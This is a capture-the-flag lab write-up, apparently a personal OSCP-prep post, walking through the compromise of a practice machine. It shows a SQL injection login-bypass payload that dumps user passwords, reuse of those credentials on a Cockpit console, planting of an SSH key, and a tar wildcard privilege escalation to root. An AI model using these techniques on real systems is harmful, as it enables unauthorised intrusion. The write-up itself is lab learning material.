---
title: PG-Cockpit
published: 2025-01-31
toc: true
draft: false
tags:
  - "SQLi"
  - "wildcard"
  - "OSCP Prep"
---

```
Scope:
192.168.134.10
```

# Recon
## Nmap

```bash
sudo nmap -sC -sV -vvvv --min-rate=5000 -sT -T5 -p- 192.168.134.10  -Pn

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: blaze
9090/tcp open  http    syn-ack Cockpit web service 198 - 220
|_http-title: Did not follow redirect to https://192.168.134.10:9090/
| http-methods: 
|_  Supported Methods: GET HEAD
```


## Feroxbuster

Port `80` gives the following output.

![](attachments/bee5251c22f7ffd9720469978d4f3cc2.png)

port `9090` however gave an immense output.

![](attachments/2e64710e843deebdb7109585c991cb48.png)

:::important
Since I got stuck here I went ahead and ran `gobuster` for good measure to try and see if I missed something.
:::

## Gobuster

![](attachments/a8c1acfd9c38679f821dc1c954032e59.png)

Feroxbuster completely missed this! Let's check it out.


## 80/TCP - HTTP

![](attachments/8e87a486c941ddf1763c8d16c054d60b.png)

I tried to enter `admin - admin` and got this red colored response:

![](attachments/0a0b3d884d7055bfc6d4dbd780dafaa4.png)

Perhaps **SQLi**?

![](attachments/297f356caf19e07b1a92d746c613470f.png)

Yup, let's do some SQLi testing.

:::note
It looks like we're dealing with a **MySQL** server. I will be referencing the [following site](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md) 
:::

After some tries I get the following:

![](attachments/ebd8607715bcdb9f460281c851a1737a.png)

Not to worry as the site still works.


## SQLi 

I fire up burp to start testing the injections:

![](attachments/3cb32b059caa25be929b7ffff5c36e3e.png)

Let's start modifying it.

```sql
'OR '' = '
```

:::note
Found it in [this resource](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/Databases/MySQL-SQLi-Login-Bypass.fuzzdb.txt?source=post_page-----7e777892e485--------------------------------):![](attachments/ec8e8560e7e9a1eb84a7ce093b080b0e.png)
:::

![](attachments/5553a42fc5938345f89c788b69abc8d9.png)

code `302`, seems good, let's try it out.

![](attachments/4d3f2fcd25ddcb670fc08ba69c26aa07.png)

Awesome

![](attachments/9a40a2de7a6b4f89b534b497f590e167.png)

```
james 
canttouchhhthiss@455152

cameron
thisscanttbetouchedd@455152
```

Returning back to port `9090` I was able to log in using *james*'s creds.


## 9090/TCP - HTTP

![](attachments/dcdc1ae91e49110153fd9ccd6b67a7ec.png)

Login screen for some sort of Ubuntu web access. 

Using *james* creds I got in:

![](attachments/0b8f4b594bff4df6d8c016e19223aaaf.png)

In the **Host > Accounts > james** section I found a spot where I could upload **Authorized Public SSH Keys** so I copy pasted my `id_rsa.pub` file into it.

![](attachments/7f1b025cb892fff2a2275a3eb9bf8f48.png)


# Foothold

Let's try to log in via SSH.

![](attachments/0c7972dab8042472706772012edcc10e.png)


## local.txt

![](attachments/443a28514dca2cce40fcab2f30cab1e2.png)


## Enumeration

![](attachments/a1019824ea9f37a647e7b80a3ee7cfc6.png)

We find the `tar *` wildcard again. From [[OSCP C#Tar Wildcard]] we learned how to do it, so we will try and abuse it in the same way.


# Privilege Escalation

Using the wildcard trick we get a `root` shell easily.

```bash
touch ./--checkpoint=1
touch ./--checkpoint-action=exec=sh 
sudo tar -czvf /tmp/backup.tar.gz *
```

![](attachments/f9e9f42cfbe597dfcd47c8b6cb9cd9a7.png)

![](attachments/d7549bc1e566d09880824c3a2ba34289.png)


## proof.txt

![](attachments/78c1d7deeeb2857d45606500c6ca1998.png)

---

